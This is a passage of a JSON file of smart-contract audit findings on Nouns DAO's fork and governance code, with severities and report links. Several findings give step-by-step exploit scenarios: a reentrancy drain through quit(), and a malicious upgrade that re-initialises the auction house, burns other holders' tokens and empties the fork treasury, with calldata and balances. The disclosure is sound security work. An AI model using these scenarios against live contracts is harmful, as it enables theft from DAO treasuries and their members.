NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds); emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason); } As remainingTokensToClaim stays zero as claimDuringForkPeriod() doesn't affect it:  NounsTokenFork.sol#L166-L174 function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external { if (msg.sender != escrow.dao()) revert OnlyOriginalDAO(); if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod(); for (uint256 i = 0; i < tokenIds.length; i++) { uint256 nounId = tokenIds[i]; _mintWithOriginalSeed(to, nounId); } } In this situation both quorum and proposal thresholds will be zero, proposals can be created with creationBlock = block.number, at which only recently joined holder have voting power:  NounsDAOLogicV1Fork.sol#L242-L305 function propose( address[] memory targets, uint256[] memory values, string[] memory signatures, bytes[] memory calldatas, string memory description ) public returns (uint256) { checkGovernanceActive(); ProposalTemp memory temp; temp.totalSupply = adjustedTotalSupply(); >> temp.proposalThreshold = bps2Uint(proposalThresholdBPS, temp.totalSupply); require( nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold, 'NounsDAO::propose: proposer votes below proposal threshold' ); ... newProposal.proposalThreshold = temp.proposalThreshold; newProposal.quorumVotes = bps2Uint(quorumVotesBPS, temp.totalSupply); ... newProposal.creationBlock = block.number; >> >> >> 10  DeployDAOV3NewContractsBase.s.sol#L18-L23 contract DeployDAOV3NewContractsBase is Script { ... uint256 public constant FORK_DAO_PROPOSAL_THRESHOLD_BPS = 25; // 0.25% uint256 public constant FORK_DAO_QUORUM_VOTES_BPS = 1000; // 10% This will give the first joiner the full power over all the later joiners:  NounsDAOLogicV1Fork.sol#L577-L589 function castVoteInternal( address voter, uint256 proposalId, uint8 support ) internal returns (uint96) { ... /// @notice: Unlike GovernerBravo, votes are considered from the block the proposal was created >> in order to normalize quorumVotes and proposalThreshold metrics ,! uint96 votes = nouns.getPriorVotes(voter, proposal.creationBlock); Say if Bob, the original nouns DAO holder with 1 noun, joined when total supply was zero, he can create proposals and with regard for these proposals his only vote will be 100% of the DAO voting power. Bob can create a proposal to transfer all the funds to himself or a hidden malicious one like shown in Fork escrowers can exploit the fork or force late joiners to quit step 6. All the later joiners will not be able to stop this proposal, no matter how big their voting power be, as votes will be counted as on block where Bob had 100% of the votes. As the scenario above is a part of expected workflow (i.e. all fork initiators can be reasonably expected to quit fast enough), the probability of it is medium, while the probability of inattentive late joiners being exploited by Bob's proposal is medium too (there is not much time to react and some holders might first of all want to explore new fork functionality), so overall probability is low, while the impact is full loss of funds for such joiners. Per low combined likelihood and high impact setting the severity to be medium.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Duplicate ERC20 tokens will send a greater than prorata token share leading to loss of DAO funds",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "_setErc20TokensToIncludeInFork() is an admin function for setting ERC20 tokens that are used when splitting funds to a fork. However, there are no sanity checks for duplicate ERC20 tokens in the erc20tokens parameter. While STETH is the only ERC20 token applicable for now, it is conceivable that DAO treasury may include others in future. The same argument applies to _setErc20TokensToIncludeInQuit() and members quitting from the fork DAO. Duplicate tokens in the array will send a greater than prorata share of those tokens to the fork DAO treasury in sendProRataTreasury() or to the quitting member in quit(). This will lead to loss of funds for the original DAO and fork DAO respectively. Low likelihood + High impact = Medium severity. 12",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious proposer can create arbitrary number of maliciously updatable proposals to signifi- cantly grief the protocol",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "checkNoActiveProp() is documented as: \"This is a spam protection mechanism to limit the num- ber of proposals each noun can back.\" However, this mitigation applies to proposer addresses holding Nouns but not the Nouns themselves because checkNoActiveProp() relies on checking the state of proposals tracked by proposer via latestProposalId = ds.latestProposalIds[proposer]. A malicious proposer can move (trans- fer/delegate) their Noun(s) to different addresses for circumventing this mitigation and create proposals from those new addresses to spam. Furthermore, proposal updation in the protocol does not check for the proposer meeting any voting power threshold at the time of updation. A malicious proposer can create arbitrary number of proposals, each from a different address by transferring/delegating their Nouns, and then update any/all of them to be malicious. Substantial effort will be required to differentiate all such proposals from the authentic ones and then cancel them, leading to DAO governance DoS griefing. Medium likelihood + Medium impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious proposer can update proposal past inattentive voters to sneak in otherwise unaccept- able details",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Updatable proposal description and transactions is a new feature being introduced in V3 to improve the UX of the proposal flow to allow proposal editing on-chain. The motivation for this feature as described in the spec is: \"Proposals get voter feedback almost entirely only once they are on-chain. At the same time, proposers are relunctant to cancel and resubmit their proposals for multiple reasons, e.g. prefering to avoid restarting the proposal lifecycle and thus delay funding.\" However, votes are bound only to the proposal identifier and not to their description (which describes the motiva- tion/intention/usage etc.) or the transactions (values transferred, contracts/functions of interaction etc.). Inattentive voters may (decide to) cast their votes based on a stale proposal's description/transactions which could since have been updated. For example, someone voting Yes on the initial proposal version may vote No if they see the updated details. A very small voting delay (MIN_VOTING_DELAY is 1 block) may even allow a malicious proposer to sneak in a malicious update at the very end of the updatable period so that voters do not see it on time to change their votes being cast. Delays in front-ends updating the proposal details may contribute to this scenario. A malicious proposer updates proposal with otherwise unacceptable txs/description to get support of inattentive voters who cast their votes based on acceptable older proposal versions. Malicious proposal passes to transfer a significant amount of treasury to unauthorized receivers for unacceptable reasons. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "NounsDAOLogicV1Fork's quit() performing external calls in-between total supply and balance reads can allow for treasury funds stealing via cross-contract reentrancy",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Let's suppose there is an initiative group of nouns holders that performed fork, claimed is block.timestamp < and immediately quitted (say for pure financial Right after forkingPeriodEndTimestamp, so isForkPeriodActive(ds) == true in original DAO contract, while NounsTokenFork.remainingTokensToClaim() == 0, so checkGovernanceActive() doesn't revert in the forked DAO contract, which have no material holdings. reasons). that it For simplicity let's say there is Bob and Alice, both aren't part of this group and still are in the original DAO, Bob have 2 nouns, Alice have 1, each nouns' share of treasury is 1 stETH and 100 ETH, erc20TokensToIncludeInQuit = [stETH]. All the above are going concern assumptions (a part of expected workflow), let's now have a low probability one: stETH contract was upgraded and now performs _beforetokentransfer() callback on every transfer to a destination address as long as it's a contract (i.e. it has a callback, for simplicity let's assume it behaves similarly 14 to ERC-721 safeTransfer). enough technical reason for such an upgrade. It doesn't make it malicious or breaks IERC20, let's just suppose there is a strong If Alice now decides to join this fork, Bob can steal from her: 1. Alice calls NounsDAOV3's joinFork(), 1 stETH and 100 ETH is transferred to NounsDAOLogicV1Fork:  NounsDAOV3Fork.sol#L139-L158 function joinFork( NounsDAOStorageV3.StorageV3 storage ds, uint256[] calldata tokenIds, uint256[] calldata proposalIds, string calldata reason ) external { if (!isForkPeriodActive(ds)) revert ForkPeriodNotActive(); INounsDAOForkEscrow forkEscrow = ds.forkEscrow; address timelock = address(ds.timelock); sendProRataTreasury(ds, ds.forkDAOTreasury, tokenIds.length, adjustedTotalSupply(ds)); for (uint256 i = 0; i < tokenIds.length; i++) { ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]); } NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds); emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason); } Alice is minted 1 forked noun:  NounsTokenFork.sol#L166-L174) function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external { if (msg.sender != escrow.dao()) revert OnlyOriginalDAO(); if (block.timestamp > forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod(); for (uint256 i = 0; i < tokenIds.length; i++) { uint256 nounId = tokenIds[i]; _mintWithOriginalSeed(to, nounId); } } 2. Bob transfers all to attack contract (cBob), that joins the DAO with 1 noun. Forked treasury is 2 stETH and 200 ETH, cBob and Alice both have 1 noun. 3. cBob calls quit() and reenters NounsDAOV3's joinFork() on stETH _beforetokentransfer() (and nothing else):  NounsDAOLogicV1Fork.sol#L201-L222 15 function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); >> } uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } 4. cBob have joined fork with another noun, stETH transfer concludes. Forked treasury is 2 stETH and 300 ETH, while 1 stETH was just sent to cBob. 5. With quit() resumed, (address(timelock).balance * tokenIds.length) / totalSupply = (300 * 1) / 2 = 150 ETH is sent to cBob:  NounsDAOLogicV1Fork.sol#L201-L222 function quit(uint256[] calldata tokenIds) external nonReentrant { checkGovernanceActive(); uint256 totalSupply = adjustedTotalSupply(); for (uint256 i = 0; i < tokenIds.length; i++) { nouns.transferFrom(msg.sender, address(timelock), tokenIds[i]); } for (uint256 i = 0; i < erc20TokensToIncludeInQuit.length; i++) { IERC20 erc20token = IERC20(erc20TokensToIncludeInQuit[i]); uint256 tokensToSend = (erc20token.balanceOf(address(timelock)) * tokenIds.length) / totalSupply; ,! bool erc20Sent = timelock.sendERC20(msg.sender, address(erc20token), tokensToSend); if (!erc20Sent) revert QuitERC20TransferFailed(); } >> uint256 ethToSend = (address(timelock).balance * tokenIds.length) / totalSupply; bool ethSent = timelock.sendETH(msg.sender, ethToSend); if (!ethSent) revert QuitETHTransferFailed(); emit Quit(msg.sender, tokenIds); } 6. Forked treasury is 2 stETH and 150 ETH, cBob calls quit() again without reentering (say on zero original nouns balance condition), obtains 1 stETH and 75 ETH, the same is left for Alice. Bob stole 25 ETH from Alice. 16 Attacking function logic can be as simple as {quit() as long as there is forkedNoun on my balance, perform joinFork() on the callback as long as there is noun on my balance}. Alice lost a part of treasury funds. The scale of the steps above can be increased to drain more significant value in absolute terms. Per low likelihood and high principal funds loss impact setting the severity to be medium.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious DAO can mint arbitrary fork DAO tokens",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "The original DAO is assumed to be honest during the fork period which is reinforced in the protocol by preventing it from executing any malicious proposals during that time. Fork joiners are minted fork DAO tokens by the original DAO via claimDuringForkPeriod() which enforces the fork period on the fork DAO side. However, the notion of fork period is different on the fork DAO compared to the original DAO (as described in Issue 16), i.e. while original DAO excludes forkEndTimestamp from the fork period, fork DAO includes forkingPeriodEndTimestamp in its notion of the fork period. If the original DAO executes a malicious proposal exactly in the block at forkEndTimestamp which makes a call to claimDuringForkPeriod() to mint arbitrary fork DAO tokens then the proposal will succeed on the original DAO side because it is one block beyond its notion of fork period. The claimDuringForkPeriod() will succeed on the fork DAO side because it is in the last block in its notion of fork period. The original DAO therefore can successfully mint arbitrary fork DAO tokens which can be used to: 1) brick the fork DAO when those tokens are attempted to be minted via auctions later or 2) manipulate the fork DAO governance to steal its treasury funds. In PoS, blocks are exactly 12 seconds apart. With forkEndTimestamp = block.timestamp + ds.forkPeriod; and ds.forkPeriod now set to 7 days, forkEndTimestamp is exactly 50400 blocks (7*24*60*60/12) after the block in which executeFork() was executed. A malicious DAO can coordinate to execute such a proposal exactly in that block. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Inattentive fork escrowers may lose funds to fork quitters",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Fork escrowers already have their original DAO treasury pro rate funds transferred to the fork DAO treasury (when fork executes) and are expected to claimFromEscrow() after fork executes to mint their fork DAO tokens and thereby lay claim on their pro rata share of fork DAO treasury for governance or exiting. Inattentive fork escrowers who fail to do so will force a delayed governance of 30 days (currently proposed value) on the fork DAO and beyond that will allow fork DAO members to quit with a greater share of the fork DAO treasury because fork execution transfers all escrowers' original DAO treasury funds to fork DAO treasury. 18 Inattentive slow-/non-claiming fork escrowers may lose funds to quitters if they do not claim their fork DAO tokens before its governance is active in 30 days after fork executes. They will also be unaccounted for in DAO functions like quorum and proposal threshold. While we would expect fork escrowers to be attentive and claim their fork DAO tokens well within the delayed governance period, the protocol design can be more defensive of slow-/non-claimers by protecting their funds on the fork DAO from quitters. Low likelihood + High impact = Medium severity. Consider be",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Upgrading timelock without transferring the nouns from old timelock balance will increase adjusted total supply",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "There is one noun on timelock V1 balance, and can be others as of migration time:  etherscan.io/token/0x9c8ff314c9bc7f6e59a9d9225fb22946427edc03?a=0x0BC3807Ec262cB779b38D65b38158acC3bfedE10 Changing ds.timelock without nouns transfer will increase adjusted total supply:  NounsDAOV3Fork.sol#L199-L201 function adjustedTotalSupply(NounsDAOStorageV3.StorageV3 storage ds) internal view returns (uint256) { return ds.nouns.totalSupply() - ds.nouns.balanceOf(address(ds.timelock)) - ,! ds.forkEscrow.numTokensOwnedByDAO(); ,! } As of time of this writing adjustedTotalSupply() will be increased by 1 due to treasury token reclassification, the upgrade will cause a (13470 + 14968) * 1733.0 * (1 / 742 - 1 / 743) = 89 USD loss per noun or (13470 + 14968) * 1733.0 / 743 = 66330 USD cumulatively for all nouns holders. Per high likelihood and low impact setting the severity to be medium.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Fork escrowers can exploit the fork or force late joiners to quit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Based in the current supply of Nouns and the following parameters that will be used during the upgrade to V3:  Nouns total supply: 743  forkThresholdBPS_: 2000 (20%)  forkThreshold: 148, hence 149 Nouns need to be escrowed to be able to call executeFork() The following attack vector would be possible: 1. Attacker escrows 75 tokens. 2. Bob escrows 74 tokens to reach the forkThreshold. 3. Bob calls executeFork() and claimFromEscrow(). 4. Attacker calls claimFromEscrow() right away. As now nouns.remainingTokensToClaim() is zero the gover- nance is now active and proposals can be created. 5. Attacker creates a malicious proposal. Currently the attacker has 75 Nouns and Bob 74 in the fork. This means that the attacker has the majority of the voting power and whatever he proposes can not be denied.  NounsForkToken.getPriorVotes(attacker, <proposalCreationBlock>) -> 75  NounsForkToken.getPriorVotes(Bob , <proposalCreationBlock>) -> 74 6. The proposal is created with the following description: \"Proposal created to upgrade the NounsAuction- HouseFork to a new implementation similar to the main NounsAuctionHouse\". The attacker deploys this new implementation and simply performs the following change in the code: modifier initializer() { - + require(_initializing || !_initialized, \"Initializable: contract is already initialized\"); require(!_initializing || _initialized, \"Initializable: contract is already initialized\"); bool isTopLevelCall = !_initializing; if (isTopLevelCall) { _initializing = true; _initialized = true; } _; if (isTopLevelCall) { _initializing = false; } } The proposal is created with the following data: targets[0] = address(contract_NounsAuctionHouseFork); values[0] = 0; signatures[0] = 'upgradeTo(address)'; calldatas[0] = abi.encode(address(contract_NounsAuctionHouseForkExploitableV1)); 7. Proposal is created and is now in Pending state. During the next days, users keep joining the fork increasing the funds of the fork treasury as the fork period is still active. 8. 5 days later proposal is in Active state and the attacker votes to pass it. Bob, who does not like the proposal, votes to reject it. 20  quorumVotes: 14  forVotes: 75  againstVotes: 74 9. As the attacker and Bob were the only users that had any voting power at the time of proposal creation, five days later, the proposal is successful. 10. Proposal is queued. 11. 3 weeks later proposal is executed. 12. The NounsAuctionHouseFork contract is upgraded to the malicious version and the attacker re-initialize it and sets himself as the owner: contract_NounsAuctionHouseFork.initialize(attacker, NounsForkToken, <WETH address>, 0, 0, 0, 0) 13. Attacker, who is now the owner, upgrades the NounsAuctionHouseFork contract, once again, to a new im- plementation that implements the following function: function burn(uint256[] memory _nounIDs) external onlyOwner{ for (uint256 i; i < _nounIDs.length; ++i){ nouns.burn(_nounIDs[i]); } } 14. Attacker now, burns all the Nouns Tokens in the fork except the ones that he owns. 15. Attacker calls quit() draining the whole treasury: NounsTokenFork.totalSupply() -> 75 attacker.balance -> 0 contract_stETH.balanceOf(attacker) -> 0 forkTreasury.balance -> 2005_383580080753701211 contract_stETH.balanceOf(forkTreasury) -> 2005_383580080753701210 attacker calls -> contract_NounsDAOLogicV1Fork.quit([0, ... 74]) attacker.balance -> 2005_383580080753701211 contract_stETH.balanceOf(attacker) -> 2005_383580080753701208 forkTreasury.balance -> 0 contract_stETH.balanceOf(forkTreasury) -> 1 Basically, the condition that should be met for this exploit is that at the time of proposal creation the attacker has If this happens, users will be more than 51% of the voting power. This is more likely to happen in small forks. forced to leave or be exploited. As there is no vetoer role, noone will be able to stop this type of proposals.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Including non-standard ERC20 tokens will revert and prevent forking/quitting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "If erc20TokensToIncludeInFork or erc20TokensToIncludeInQuit accidentally/maliciously include non-confirming ERC20 tokens, such as USDT, which do not return a boolean value on transfers then sendProRata- Treasury() and quit() will revert because it expects timelock.sendERC20() to return true from the underlying ERC20 transfer call. The use of transfer() instead of safeTransfer() allows this scenario. Low likelihood + High impact = Medium severity. Inclusion of USDT-like tokens in protocol will revert sendProRataTreasury() and quit() to prevent forking/quitting.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Changing voteSnapshotBlockSwitchProposalId after it was set allows for votes double counting",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "Now ds.voteSnapshotBlockSwitchProposalId can be changed after it was once set to the next proposal id, there are no restrictions on repetitive setting. In the same time, proposal votes are counted without saving the additional information needed to reconstruct the timing and voteSnapshotBlockSwitchProposalId moved forward as a result of such second _setVoteSnap- shotBlockSwitchProposalId() call will produce a situation when all the older, already cast, votes for the propos- als with old_voteSnapshotBlockSwitchProposalId <= id < new_voteSnapshotBlockSwitchProposalId will be counted as of proposal.startBlock, while all the never, still to be casted, votes for the very same proposals will be counted as of proposal.creationBlock. Since the voting power of users can vary in-between these timestamps, this will violate the equality of voting conditions for all such proposals. Double counting will be possible and total votes greater than total supply can be cast this way: say Bob has transferred his nouns to Alice between proposal.startBlock and pro- posal.creationBlock, Alice voted before the change, Bob voted after the change. Bob's nounces will be counted twice. Severity is medium: impact looks to be high, a violation of equal foot voting paves a way for voting manipulations, but there is a low likelihood prerequisite of passing a proposal for the second update for the voteSnapshotBlock- SwitchProposalId. The latter can happen as a part of bigger pack of changes. _setVoteSnapshotBlockSwitch- ProposalId() call do not have arguments and by itself repeating it doesn't look incorrect.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Key fork parameters are set outside of proposal flow, while aren't being controlled in the code",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "These configuration parameters are crucial for fork workflow and new DAO logic, but aren't checked when being set in ForkDAODeployer's constructor:  ForkDAODeployer.sol#L31-L81 contract ForkDAODeployer is IForkDAODeployer { ... constructor( address tokenImpl_, address auctionImpl_, address governorImpl_, address treasuryImpl_, uint256 delayedGovernanceMaxDuration_, uint256 initialVotingPeriod_, uint256 initialVotingDelay_, uint256 initialProposalThresholdBPS_, uint256 initialQuorumVotesBPS_ ) { } ... delayedGovernanceMaxDuration = delayedGovernanceMaxDuration_; initialVotingPeriod = initialVotingPeriod_; initialVotingDelay = initialVotingDelay_; initialProposalThresholdBPS = initialProposalThresholdBPS_; initialQuorumVotesBPS = initialQuorumVotesBPS_; While most parameters are set via proposals directly and are controlled in the corresponding setters, these 5 variables are defined only once on ForkDAODeployer construction and neither per se visible in proposals, as ForkDAODeployer is being set as an address there, nor being controlled within the corresponding setters this way. Their values aren't controlled on construction either. 23  NounsDAOLogicV3.sol#L820-L840 /** * @notice Admin function for setting the fork related parameters * @param forkEscrow_ the fork escrow contract * @param forkDAODeployer_ the fork dao deployer contract * @param erc20TokensToIncludeInFork_ the ERC20 tokens used when splitting funds to a fork * @param forkPeriod_ the period during which it's possible to join a fork after exeuction * @param forkThresholdBPS_ the threshold required of escrowed nouns in order to execute a fork */ function _setForkParams( address forkEscrow_, address forkDAODeployer_, address[] calldata erc20TokensToIncludeInFork_, uint256 forkPeriod_, uint256 forkThresholdBPS_ ) external { ds._setForkEscrow(forkEscrow_); ds._setForkDAODeployer(forkDAODeployer_); ds._setErc20TokensToIncludeInFork(erc20TokensToIncludeInFork_); ds._setForkPeriod(forkPeriod_); ds._setForkThresholdBPS(forkThresholdBPS_); }  NounsDAOV3Admin.sol#L484-L495 /** * @notice Admin function for setting the fork DAO deployer contract */ function _setForkDAODeployer(NounsDAOStorageV3.StorageV3 storage ds, address newForkDAODeployer) external onlyAdmin(ds) address oldForkDAODeployer = address(ds.forkDAODeployer); ds.forkDAODeployer = IForkDAODeployer(newForkDAODeployer); emit ForkDAODeployerSet(oldForkDAODeployer, newForkDAODeployer); { } Impact: an setting example, delayedGovernanceMaxDuration = 0 As bypasses NounsDAOLogicV1Fork's checkGovernanceActive() control and allows for stealing the whole treasury of a new forked DAO with executeFork() NounsTokenFork.claimFromEscrow() -> NounsDAOLogicV1Fork.quit() deployment transaction. An attacker will be entitled to 1 / 1 = 100% of the new DAO funds being the only one who claimed. back-running call Setting medium severity per low likelihood and high impact of misconfiguration, which can happen both as an operational mistake or be driven by a malicious intent.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious DAO can hold token holders captive by setting forkPeriod to an unreasonably low value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "A malicious majority can reduce the number of Noun holders joining an executed fork by setting the forkPeriod to an unreasonably low value, e.g. 0, because there is no MIN_FORK_PERIOD enforced (MAX is 14 days). This in combination with an unreasonably high forkThresholdBPS (no min/max enforced) will allow a malicious majority to hold captive those minority Noun holders who missed the fork escrow window, cannot join the fork in the unreasonably small fork period and do no have sufficient voting power to fork again. While the accidental setting of the lower bound to an undesirable value poses a lower risk than that of the upper bound, this is yet another vector of attack by a malicious majority on forking capability/effectiveness. While the majority can upgrade the DAO entirely at will to circumvent all such guardrails, we hypothesise that would get more/all attention by token holders than modification of governance/fork parameters whose risk/impact may not be apparent immediately to non-technical or even technical holders. So unless there is an automated impact review/analysis performed as part of governance processes, such proposal vectors on governance/forking parameters should be considered as posing non-negligible risk. Impact: Inattentive minority Noun holders are unable to join the fork and forced to stick with the original DAO. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious DAO can prevent forking by manipulating the forkThresholdBPS value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "While some of the documentation, see 1 and 2, note that the fork threshold is expected to be 20%, the forkThresholdBPS is a DAO governance controlled value that may be modified via _setForkThresholdBPS(). A malicious majority can prevent forking at any time by setting the forkThresholdBPS to an unreasonably high value that is >= majority voting power. For a fork that is slowly gathering support via escrowing (thus giving time for a DAO proposal to be executed) , a malicious majority can reactively manipulate forkThresholdBPS to prevent that fork from being executed. While the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties and their impacts. Token holders need to actively monitor all proposals for malicious updates to create, execute and join a fork before such a proposal takes effect. A malicious majority can prevent a minority from forking by manipulating the forkThresholdBPS value. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious DAO can prevent/deter token holders from executing/joining a fork by including arbi- trary addresses in erc20TokensToIncludeInFork",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "As motivated in the fork spec, forking is a minority protection mechanism that should always allow a group of minority token holders to exit together into a new instance of Nouns DAO. in the (modifiable original DAO may a malicious majority in However, erc20TokensToIncludeInFork on balanceOf() or transfer() calls to prevent token holders from executing or joining a fork. While the governance process gives an opportunity to detect and block such malicious proposals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties which allows a proposal to hide malicious ERC20 tokens and get them included in the DAO's allow list. Token holders need to monitor all proposals for malicious updates to create, execute and join a fork before such a proposal takes effect. _setErc20TokensToIncludeInFork()) addresses revert arbitrary include that via Furthermore, a forking token holder may not necessarily want to receive all the DAO's ERC20 tokens in their new fork DAO for various reasons. For e.g., custody of certain ERC20 tokens may not be legal in their regulatory jurisdictions and so they may not want to interact with a DAO whose treasury holds such tokens and may send them at some point (e.g. rage quit). Minority token holders may even want to fork specifically because of an ERC20's presence or proposed inclusion in the DAO treasury. Giving forking holders a choice of ERC20s to take to fork DAO gives them a choice to fork anytime only with ETH and a subset of approved tokens if the DAO has already managed to add malicious/contentious ERC20s in the list. 1. A malicious DAO can prevent unsuspecting/inattentive or future token holders from forking and taking out their pro rata funds, which is the main motivation for minority protection as specified. 2. A forking token holder is forced to end up with a fork DAO treasury that has all the original DAO's ERC20 tokens without having a choice, which may deter them from creating/executing/joining a fork in the first place. Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "A malicious new DAO can prevent/deter token holders from rage quitting by including arbitrary addresses in erc20TokensToIncludeInQuit",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "As described in the fork spec: \"New DAOs are deployed with vanilla ragequit in place; otherwise it's possible for a new DAO majority to collude to hurt a minority, and the minority wouldn't have any last resort if they can't reach the forking threshold; furthermore bullies/attackers can recursively chase minorities into fork DAOs in an undesired attrition war.\". However, a malicious new DAO may include arbitrary addresses in erc20TokensToIncludeInQuit (modifiable via _setErc20TokensToIncludeInQuit()) that revert on balanceOf() or transfer() calls to prevent token holders from rage quitting. While the governance process gives an opportunity to detect and block such malicious pro- posals, the assumption is that a malicious majority can force through any proposal, even a visibly malicious one. Also, it is not certain that all governance proposals undergo thorough scrutiny of security properties which allows a proposal to hide malicious ERC20 tokens and get them included in the DAO's allow list. Token holders need to monitor all proposals for malicious updates and rage quit before such a proposal takes effect. Furthermore, a rage quitting token holder may not necessarily want to receive all the DAO's ERC20 tokens for various reasons. For e.g., custody of certain ERC20 tokens may not be legal in their regulatory jurisdictions. (1) A malicious new DAO can prevent unsuspecting/inattentive token holders from rage quitting and taking out their pro rata funds, which is a critical capability for minority protection as specified. (2) A rage quitting token holder is forced to receive all the DAO's ERC20 tokens without having a choice, which may deter them from quitting.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk"
        ]
    },
    {
        "title": "Missing check for vetoed proposal's target timelock can cancel transactions from other proposals on new DAO treasury",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
        "body": "veto() always assumes that the proposal being vetoed is targeting ds.timelock (i.e. the new DAO treasury) instead of checking via getProposalTimelock() as done by queue(), execute() and cancel() functions. If the proposal being vetoed were targeting timelockV1 (i.e. original DAO treasury) then this results in calling cancelTransaction() on the wrong timelock which sets queuedTransactions[txHash] to false for values of target, value, signature, data and eta. The proposal state is vetoed with zombie queued transactions on timelockV1 which will never get executed. But if there coincidentally were valid transactions with the same values (of target, value, signature, data and eta) from other proposals queued (assuming in the same block and that both timelocks have the same delay so that eta is the same) on ds.timelock then those would unexpectedly and incorrectly get dequeued and will not be executed even when these other ds.timelock targeting proposals were neither vetoed nor cancelled. Successfully voted proposals on new DAO treasury have their transactions cancelled before execution. Nouns- Confirmed with PoC: veto_poc.txt Low likelihood + High impact = Medium severity.",
        "labels": [
            "Spearbit",
            "Nouns",
            "Severity: Medium Risk NounsDAOV3Proposals.sol#L435 NounsDAOV3Proposals.sol#L527-L544"
        ]
    },
    {
        "title": "Proposal threshold can be bypassed through the proposeBySigs() function",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Nouns-Spearbit-Security-Review.pdf",
